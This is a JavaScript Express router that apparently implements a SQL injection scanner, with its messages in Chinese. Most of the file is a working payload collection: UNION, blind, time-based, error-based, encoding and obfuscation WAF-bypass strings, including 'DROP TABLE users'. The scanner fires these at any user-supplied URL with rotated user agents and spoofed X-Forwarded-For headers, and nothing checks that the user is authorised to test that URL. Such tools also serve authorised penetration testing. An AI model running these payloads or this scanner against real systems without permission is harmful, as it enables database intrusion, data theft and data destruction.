const express = require('express')
const router = express.Router()
const axios = require('axios')

const sqlPayloads = {
  basic: [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'x'='x",
    "\" OR \"1\"=\"1",
    "' OR 1=1#",
    "' AND '1'='2",
    "' AND 1=2--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' ORDER BY 1--",
    "' ORDER BY 999--"
  ],
  wafBypass: [
    "'/**/OR/**/'1'='1",
    "'/*comment*/OR/*comment*/1=1--",
    "'%20OR%20'1'='1",
    "%27%20OR%20%271%27=%271",
    "%22%20OR%20%221%22=%221",
    "'+OR+'1'='1",
    "'+OR+1=1--",
    "'||OR||'1'='1",
    "'||OR||1=1--",
    "Id=1'--",
    "Id=1';--",
    "Id=1'/*",
    "Id=1' OR SLEEP(3)--",
    "Id=1' AND SLEEP(3)--",
    "Id=-1' UNION SELECT 1,2--",
    "Id=1' AND (SELECT COUNT(*) FROM users) > 0--",
    "Id=1' OR 1=(SELECT COUNT(*) FROM information_schema.tables)--",
    "1' OR '1'='1",
    "1') OR ('1'='1",
    "1\") OR (\"1\"=\"1",
    "1')) OR (('1'='1",
    "Id=1'; DROP TABLE users--",
    "Id=1'; SELECT @@VERSION--",
    "Id=1'; EXEC sp_who--",
    "Id=1'; WAITFOR DELAY '00:00:03'--"
  ],
  encoding: [
    "%27%4F%52%20%27%31%27%3D%27%31",
    "%27%6F%72%20%27%31%27%3D%27%31",
    "%u0027%u004F%u0052%u0020%u0027%u0031%u0027%u003D%u0027%u0031",
    "%27%20%4F%52%20%31%3D%31%2D%2D",
    "%69%64%3D%31%27%20%4F%52%20%27%31%27%3D%27%31",
    "id=1%27%20OR%201%3D1--"
  ],
  obfuscation: [
    "' O'+'R' '1'='1",
    "' O''R '1'='1",
    "' O/*abc*/R '1'='1",
    "' O%00R '1'='1",
    "' O\nR '1'='1",
    "' O\rR '1'='1",
    "' O\tR '1'='1",
    "' OR/**/1=1--",
    "' OR%0A1=1--",
    "' OR%0D1=1--",
    "' OR%091=1--",
    "' OR%201=1--",
    "' OR+1=1--",
    "' OR%2B1=1--",
    "' OR%0C1=1--"
  ],
  timeBased: [
    "' OR SLEEP(3)--",
    "' OR BENCHMARK(10000000,MD5(1))--",
    "' OR WAITFOR DELAY '0:0:3'--",
    "'; SELECT SLEEP(3)--",
    "'; DO SLEEP(3)--",
    "'; pg_sleep(3)--",
    "'; WAITFOR DELAY '00:00:03'--",
    "') OR SLEEP(3)--",
    "' OR IF(1=1,SLEEP(3),0)--",
    "' OR CASE WHEN 1=1 THEN SLEEP(3) ELSE 0 END--",
    "1' AND SLEEP(3)--",
    "1') AND SLEEP(3)--",
    "Id=1' OR SLEEP(3)--",
    "Id=1' AND SLEEP(3)--",
    "Id=1) OR SLEEP(3)--",
    "Id=1') OR SLEEP(3)--"
  ],
  unionBased: [
    "Id=-1' UNION SELECT 1,2,3--",
    "Id=-1' UNION SELECT NULL,NULL,NULL--",
    "Id=-1' UNION SELECT 1,@@VERSION,3--",
    "Id=-1' UNION SELECT 1,DATABASE(),3--",
    "Id=-1' UNION SELECT 1,USER(),3--",
    "Id=-1' UNION SELECT 1,CURRENT_USER(),3--",
    "Id=-1' UNION SELECT 1,SYSTEM_USER(),3--",
    "Id=-1' UNION SELECT 1,CONCAT_WS(0x3a,USER(),DATABASE()),3--",
    "Id=-1') UNION SELECT 1,2,3--",
    "Id=-1\") UNION SELECT 1,2,3--",
    "Id=-1')) UNION SELECT 1,2,3--",
    "Id=1' UNION SELECT 1,2,3--",
    "Id=1') UNION SELECT 1,2,3--"
  ],
  errorBased: [
    "' OR 1=(SELECT COUNT(*) FROM information_schema.tables)--",
    "' OR (SELECT COUNT(*) FROM users) > 0--",
    "' OR 1=CONVERT(int, (SELECT @@VERSION))--",
    "' OR 1=(SELECT 1 UNION SELECT 2)--",
    "' OR EXISTS(SELECT * FROM users)--",
    "' OR 1=CAST((SELECT @@VERSION) AS CHAR)--",
    "' OR 1=SYS.FN_VARBINTOHEXSTR(DB_ID())--",
    "' OR 1=(SELECT TOP 1 name FROM sys.tables)--",
    "' OR 1=(SELECT 1 FROM information_schema.columns)--",
    "' OR (SELECT 1 UNION SELECT 2) > 0--",
    "' OR STUFF((SELECT TOP 1 name FROM sys.tables),1,0,'')--",
    "' OR XPATHQUERY('/invalid')--",
    "' OR OPENROWSET('SQLOLEDB','Server=localhost;Trusted_Connection=yes','SELECT * FROM users')--"
  ],
  blindBoolean: [
    "' AND (SELECT COUNT(*) FROM users) > 0--",
    "' AND (SELECT COUNT(*) FROM users) = 0--",
    "' AND LENGTH((SELECT @@VERSION)) > 0--",
    "' AND ASCII(SUBSTRING((SELECT @@VERSION),1,1)) > 0--",
    "' AND IF(1=1,1,0)--",
    "' AND CASE WHEN 1=1 THEN 1 ELSE 0 END--",
    "' AND 1=(SELECT 1 WHERE 1=1)--",
    "' AND EXISTS(SELECT * FROM information_schema.tables)--",
    "' AND (SELECT SUBSTRING(@@VERSION,1,1))='5'--",
    "' AND (SELECT LENGTH(DATABASE()))>0--",
    "' AND (SELECT ASCII(SUBSTRING(DATABASE(),1,1)))>0--",
    "Id=1' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>64--"
  ],
  hpp: [
    "id=1&id=2'",
    "id=1'&id=2",
    "id=1&id=1'",
    "id=1'--&id=2",
    "id=1&id=1'--",
    "id=1&id=1' OR 1=1--",
    "id=1' OR 1=1--&id=2",
    "id=1&id=1' UNION SELECT 1,2--"
  ],
  specialChars: [
    "';",
    "'--",
    "'#",
    "'/*",
    "'*/",
    "');",
    "')--",
    "\");",
    "\")--",
    "'));",
    "'))--",
    "' OR 1=1",
    "' AND 1=2",
    "\" OR \"1\"=\"1",
    "\" AND \"1\"=\"2",
    "') OR ('1'='1",
    "') AND ('1'='2",
    "\") OR (\"1\"=\"1",
    "\") AND (\"1\"=\"2"
  ]
}

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Edge/120.0.0.0',
  'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'curl/7.88.1',
  'python-requests/2.31.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
]

const createAxiosInstance = (customHeaders = {}) => {
  const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)]
  
  return axios.create({
    timeout: 15000,
    headers: {
      'User-Agent': randomUA,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
      'Accept-Encoding': 'gzip, deflate',
      'Connection': 'keep-alive',
      'Cache-Control': 'max-age=0',
      'Referer': 'http://google.com',
      'Origin': 'http://example.com',
      ...customHeaders
    },
    validateStatus: () => true,
    maxRedirects: 5,
    decompress: true
  })
}

const analyzeResponse = (response, payloadType, baseResponseTime = 0) => {
  const data = typeof response.data === 'string' ? response.data : JSON.stringify(response.data)
  const lowerData = data.toLowerCase()
  
  let score = 0
  let detectionDetails = []
  
  const sqlErrorPatterns = [
    { pattern: /mysql.*error/i, name: 'MySQL错误' },
    { pattern: /sql.*syntax/i, name: 'SQL语法错误' },
    { pattern: /unclosed.*quote/i, name: '未闭合引号' },
    { pattern: /you have an error in your sql syntax/i, name: 'MySQL语法错误' },
    { pattern: /warning.*mysql/i, name: 'MySQL警告' },
    { pattern: /postgresql.*error/i, name: 'PostgreSQL错误' },
    { pattern: /mssql.*error/i, name: 'MSSQL错误' },
    { pattern: /microsoft.*sql.*server/i, name: 'Microsoft SQL Server错误' },
    { pattern: /odbc.*error/i, name: 'ODBC错误' },
    { pattern: /sqlstate/i, name: 'SQLState错误' },
    { pattern: /invalid.*sql/i, name: '无效SQL' },
    { pattern: /database.*error/i, name: '数据库错误' },
    { pattern: /query.*failed/i, name: '查询失败' },
    { pattern: /exception.*sql/i, name: 'SQL异常' },
    { pattern: /fatal.*error.*sql/i, name: '致命SQL错误' },
    { pattern: /unknown column/i, name: '未知列' },
    { pattern: /table.*doesn't exist/i, name: '表不存在' },
    { pattern: /column.*not found/i, name: '列不存在' },
    { pattern: /syntax error/i, name: '语法错误' },
    { pattern: /parse error/i, name: '解析错误' },
    { pattern: /access denied/i, name: '访问被拒绝' },
    { pattern: /permission denied/i, name: '权限拒绝' },
    { pattern: /union.*select/i, name: 'UNION SELECT' },
    { pattern: /information_schema/i, name: 'information_schema访问' },
    { pattern: /version.*mysql/i, name: 'MySQL版本' },
    { pattern: /version.*postgresql/i, name: 'PostgreSQL版本' },
    { pattern: /microsoft.*access/i, name: 'Microsoft Access' },
    { pattern: /sqlite.*error/i, name: 'SQLite错误' },
    { pattern: /oracle.*error/i, name: 'Oracle错误' },
    { pattern: /duplicate entry/i, name: '重复条目' },
    { pattern: /out of range/i, name: '超出范围' },
    { pattern: /division by zero/i, name: '除零错误' },
    { pattern: /stack overflow/i, name: '栈溢出' },
    { pattern: /memory exhausted/i, name: '内存耗尽' },
    { pattern: /deadlock/i, name: '死锁' },
    { pattern: /timeout/i, name: '超时' },
    { pattern: /procedure.*not found/i, name: '存储过程不存在' },
    { pattern: /function.*not found/i, name: '函数不存在' },
    { pattern: /trigger.*not found/i, name: '触发器不存在' },
    { pattern: /view.*not found/i, name: '视图不存在' },
    { pattern: /index.*not found/i, name: '索引不存在' }
  ]
  
  for (const { pattern, name } of sqlErrorPatterns) {
    if (pattern.test(data)) {
      score += 3
      detectionDetails.push(name)
    }
  }
  
  const dataLength = data.length
  const statusCode = response.status
  const responseTime = response.responseTime || 0
  const timeDelay = responseTime - baseResponseTime
  
  if (statusCode === 200 && dataLength > 0) {
    score += 1
    if (payloadType === 'boolean' || payloadType === 'unionBased') {
      score += 1
    }
  }
  
  if (statusCode === 401) {
    score += 2
    detectionDetails.push('访问控制绕过尝试(401)')
  }
  
  if (statusCode === 403) {
    score += 2
    detectionDetails.push('访问被拒绝(403)')
  }
  
  if (statusCode === 500) {
    score += 4
    detectionDetails.push('服务器错误(500)')
  }
  
  if (statusCode === 503) {
    score += 2
    detectionDetails.push('服务不可用(503)')
  }
  
  if (statusCode === 400) {
    score += 1
    detectionDetails.push('请求格式错误(400)')
  }
  
  if (payloadType === 'timeBased') {
    if (timeDelay > 2000) {
      score += 6
      detectionDetails.push('时间延迟检测')
    } else if (timeDelay > 1000) {
      score += 3
      detectionDetails.push('轻微时间延迟')
    } else {
      score += 1
    }
  }
  
  if (payloadType === 'unionBased') {
    if (dataLength > 100) {
      score += 2
    }
    if (lowerData.includes('version') || lowerData.includes('database')) {
      score += 2
    }
  }
  
  if (lowerData.includes('sql') || lowerData.includes('database') || lowerData.includes('query')) {
    score += 1
  }
  
  if (lowerData.includes('union') || lowerData.includes('select') || lowerData.includes('insert')) {
    score += 1
  }
  
  if (lowerData.includes('error') || lowerData.includes('exception') || lowerData.includes('fail')) {
    score += 1
  }
  
  if (lowerData.includes('warning') || lowerData.includes('notice')) {
    score += 1
  }
  
  const isVulnerable = score >= 3
  
  return {
    score,
    isVulnerable,
    statusCode,
    dataLength,
    responseTime,
    timeDelay,
    hasSqlError: score >= 4,
    detectionDetails,
    confidence: isVulnerable ? (score >= 7 ? '高' : score >= 5 ? '中' : '低') : '无'
  }
}

const testPayload = async (instance, url, parameter, method, payload, payloadType, baseResponseTime) => {
  const startTime = Date.now()
  
  try {
    let response
    const testPayload = encodeURIComponent(payload)
    
    switch (method.toUpperCase()) {
      case 'GET': {
        const separator = url.includes('?') ? '&' : '?'
        const testUrl = `${url}${separator}${parameter}=${testPayload}`
        response = await instance.get(testUrl)
        break
      }
      case 'POST': {
        const data = { [parameter]: payload }
        response = await instance.post(url, data)
        break
      }
      case 'PUT': {
        const data = { [parameter]: payload }
        response = await instance.put(url, data)
        break
      }
      case 'DELETE': {
        const separator = url.includes('?') ? '&' : '?'
        const testUrl = `${url}${separator}${parameter}=${testPayload}`
        response = await instance.delete(testUrl)
        break
      }
      case 'PATCH': {
        const data = { [parameter]: payload }
        response = await instance.patch(url, data)
        break
      }
      case 'OPTIONS': {
        const separator = url.includes('?') ? '&' : '?'
        const testUrl = `${url}${separator}${parameter}=${testPayload}`
        response = await instance.options(testUrl)
        break
      }
      default: {
        const separator = url.includes('?') ? '&' : '?'
        const testUrl = `${url}${separator}${parameter}=${testPayload}`
        response = await instance.get(testUrl)
      }
    }
    
    const responseTime = Date.now() - startTime
    response.responseTime = responseTime
    const analysis = analyzeResponse(response, payloadType, baseResponseTime)
    
    return {
      payload,
      type: payloadType,
      method: method.toUpperCase(),
      status: response.status,
      responseTime,
      timeDelay: analysis.timeDelay,
      ...analysis
    }
  } catch (error) {
    const responseTime = Date.now() - startTime
    return {
      payload,
      type: payloadType,
      method: method.toUpperCase(),
      status: error.response?.status || 0,
      responseTime,
      timeDelay: responseTime - baseResponseTime,
      score: 0,
      isVulnerable: false,
      error: error.message,
      detectionDetails: [],
      confidence: '无'
    }
  }
}

const getBaseResponseTime = async (instance, url, parameter, method) => {
  try {
    const startTime = Date.now()
    const testValue = 'test123'
    
    switch (method.toUpperCase()) {
      case 'GET': {
        const separator = url.includes('?') ? '&' : '?'
        await instance.get(`${url}${separator}${parameter}=${testValue}`)
        break
      }
      case 'POST': {
        await instance.post(url, { [parameter]: testValue })
        break
      }
      case 'PUT': {
        await instance.put(url, { [parameter]: testValue })
        break
      }
      case 'DELETE': {
        const separator = url.includes('?') ? '&' : '?'
        await instance.delete(`${url}${separator}${parameter}=${testValue}`)
        break
      }
      case 'PATCH': {
        await instance.patch(url, { [parameter]: testValue })
        break
      }
      case 'OPTIONS': {
        const separator = url.includes('?') ? '&' : '?'
        await instance.options(`${url}${separator}${parameter}=${testValue}`)
        break
      }
      default: {
        const separator = url.includes('?') ? '&' : '?'
        await instance.get(`${url}${separator}${parameter}=${testValue}`)
      }
    }
    
    return Date.now() - startTime
  } catch {
    return 0
  }
}

router.post('/test', async (req, res) => {
  const { url, parameter, method = 'GET', concurrency = 3 } = req.body
  
  if (!url || !parameter) {
    return res.status(400).json({ error: '请提供目标URL和参数名', code: 'INVALID_INPUT' })
  }
  
  try {
    new URL(url)
  } catch {
    return res.status(400).json({ error: '无效的URL格式', code: 'INVALID_URL' })
  }
  
  const allPayloadTypes = Object.keys(sqlPayloads)
  
  const instance = createAxiosInstance()
  const startTime = Date.now()
  
  let baseResponseTime = 0
  try {
    baseResponseTime = await getBaseResponseTime(instance, url, parameter, method)
  } catch (error) {
    return res.status(500).json({ error: '无法连接到目标服务器', code: 'CONNECTION_FAILED', details: error.message })
  }
  
  const allPayloads = []
  for (const type of allPayloadTypes) {
    for (const payload of sqlPayloads[type]) {
      allPayloads.push({ payload, type })
    }
  }
  
  const chunks = []
  for (let i = 0; i < allPayloads.length; i += concurrency) {
    chunks.push(allPayloads.slice(i, i + concurrency))
  }
  
  const results = []
  let detectedVulnerable = false
  
  for (const chunk of chunks) {
    const promises = chunk.map(async ({ payload, type }) => {
      return await testPayload(instance, url, parameter, method, payload, type, baseResponseTime)
    })
    
    const chunkResults = await Promise.all(promises)
    results.push(...chunkResults)
    
    if (chunkResults.some(r => r.isVulnerable)) {
      detectedVulnerable = true
    }
  }
  
  const totalTime = Date.now() - startTime
  
  const vulnerableResults = results.filter(r => r.isVulnerable)
  
  const groupedResults = {}
  for (const type of allPayloadTypes) {
    groupedResults[type] = results.filter(r => r.type === type)
  }
  
  res.json({
    success: true,
    vulnerable: detectedVulnerable,
    url,
    parameter,
    method,
    totalTests: results.length,
    vulnerableCount: vulnerableResults.length,
    totalTime: `${totalTime}ms`,
    avgResponseTime: `${Math.round(totalTime / results.length)}ms`,
    baseResponseTime: `${baseResponseTime}ms`,
    detected: detectedVulnerable ? 'SQL注入漏洞已检测到' : '未检测到SQL注入漏洞',
    vulnerableDetails: vulnerableResults.length > 0 ? vulnerableResults : null,
    groupedResults,
    allResults: results
  })
})

router.post('/detailed', async (req, res) => {
  const { url, parameter, method = 'GET' } = req.body
  
  if (!url || !parameter) {
    return res.status(400).json({ error: '请提供目标URL和参数名', code: 'INVALID_INPUT' })
  }
  
  const instance = createAxiosInstance()
  
  try {
    const baseResponseTime = await getBaseResponseTime(instance, url, parameter, method)
    
    const results = []
    const injectionTypes = []
    
    const payloadTypeOrder = ['basic', 'wafBypass', 'encoding', 'obfuscation', 'unionBased', 'errorBased', 'blindBoolean', 'timeBased', 'hpp', 'specialChars']
    
    for (const type of payloadTypeOrder) {
      for (const payload of sqlPayloads[type]) {
        const result = await testPayload(instance, url, parameter, method, payload, type, baseResponseTime)
        results.push(result)
        if (result.isVulnerable && !injectionTypes.includes(type)) {
          injectionTypes.push(type)
        }
      }
    }
    
    const vulnerable = injectionTypes.length > 0
    
    const typeDescriptions = {
      basic: '基础注入',
      wafBypass: 'WAF绕过',
      encoding: '编码绕过',
      obfuscation: '混淆绕过',
      timeBased: '时间盲注',
      unionBased: 'UNION注入',
      errorBased: '错误注入',
      blindBoolean: '布尔盲注',
      hpp: 'HTTP参数污染',
      specialChars: '特殊字符注入'
    }
    
    res.json({
      success: true,
      vulnerable,
      url,
      parameter,
      method,
      detectedTypes: injectionTypes,
      detectedTypeNames: injectionTypes.map(t => typeDescriptions[t] || t),
      description: vulnerable 
        ? `检测到以下SQL注入类型: ${injectionTypes.map(t => typeDescriptions[t] || t).join(', ')}`
        : '未检测到SQL注入漏洞',
      recommendations: vulnerable ? [
        '使用参数化查询（Prepared Statements）',
        '使用ORM框架进行数据库操作',
        '对用户输入进行严格验证和过滤',
        '使用Web应用防火墙（WAF）',
        '最小化数据库用户权限',
        '启用SQL错误信息屏蔽',
        '实施输入编码和转义'
      ] : [],
      totalTests: results.length,
      vulnerableCount: results.filter(r => r.isVulnerable).length,
      baseResponseTime: `${baseResponseTime}ms`,
      results
    })
  } catch (error) {
    res.status(500).json({ error: '检测失败', code: 'INTERNAL_ERROR', details: error.message })
  }
})

router.post('/bypass', async (req, res) => {
  const { url, parameter, method = 'GET' } = req.body
  
  if (!url || !parameter) {
    return res.status(400).json({ error: '请提供目标URL和参数名', code: 'INVALID_INPUT' })
  }
  
  const bypassPayloads = [
    ...sqlPayloads.wafBypass,
    ...sqlPayloads.encoding,
    ...sqlPayloads.obfuscation,
    ...sqlPayloads.hpp
  ]
  
  const customHeadersList = [
    {},
    { 'X-Forwarded-For': '127.0.0.1' },
    { 'X-Forwarded-For': 'localhost' },
    { 'X-Originating-IP': '127.0.0.1' },
    { 'X-Remote-IP': '127.0.0.1' },
    { 'X-Client-IP': '127.0.0.1' },
    { 'X-Real-IP': '127.0.0.1' },
    { 'Referer': url },
    { 'X-WAF-Bypass': 'true' },
    { 'X-Requested-With': 'XMLHttpRequest' },
    { 'X-Requested-With': 'XMLHttpRequest', 'X-Forwarded-For': '127.0.0.1' }
  ]
  
  const results = []
  let detectedVulnerable = false
  
  for (const headers of customHeadersList) {
    const instance = createAxiosInstance(headers)
    
    for (const payload of bypassPayloads) {
      const result = await testPayload(instance, url, parameter, method, payload, 'wafBypass', 0)
      result.headersUsed = headers
      results.push(result)
      
      if (result.isVulnerable) {
        detectedVulnerable = true
      }
    }
  }
  
  const vulnerableResults = results.filter(r => r.isVulnerable)
  
  res.json({
    success: true,
    vulnerable: detectedVulnerable,
    url,
    parameter,
    method,
    totalTests: results.length,
    vulnerableCount: vulnerableResults.length,
    detected: detectedVulnerable ? 'SQL注入漏洞已检测到（WAF绕过成功）' : '未检测到SQL注入漏洞',
    vulnerableDetails: vulnerableResults.length > 0 ? vulnerableResults : null,
    allResults: results
  })
})

module.exports = router